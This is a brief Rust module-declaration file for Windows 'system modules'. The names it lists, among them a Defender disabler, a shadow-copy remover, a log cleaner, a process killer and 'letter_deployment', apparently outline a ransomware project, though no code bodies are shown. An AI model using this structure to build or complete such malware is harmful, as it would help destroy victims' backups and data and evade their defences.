// System modules for Windows-specific operations
pub mod defender_disabler;
pub mod deletion;
pub mod vss_remover;
pub mod windows_backend;
pub mod windows_icons;
pub mod entry;
pub mod letter_deployment;
pub mod log_cleaner;
pub mod process_killer;
pub mod file_lock_handler;
pub mod task_manager;

// Re-exports
pub use defender_disabler::*;
pub use deletion::*;
pub use vss_remover::*;
pub use windows_backend::*;
pub use windows_icons::*;
pub use entry::*;
pub use letter_deployment::*;
pub use log_cleaner::*;
pub use process_killer::*;
pub use file_lock_handler::*;
pub use task_manager::*;
